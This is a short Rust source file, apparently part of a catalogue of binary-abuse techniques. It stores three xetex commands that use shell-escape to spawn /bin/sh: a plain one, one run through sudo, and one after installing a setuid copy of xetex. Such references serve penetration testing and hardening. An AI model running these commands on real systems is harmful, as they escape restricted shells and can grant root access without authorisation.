pub static BIN_NAME: &'static str = "xetex";
pub static SH_CODE: &'static str = r#"
    
    xetex --shell-escape '\write18{/bin/sh}\end'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo xetex --shell-escape '\write18{/bin/sh}\end'
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which xetex) .

    ./xetex --shell-escape '\write18{/bin/sh}\end'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
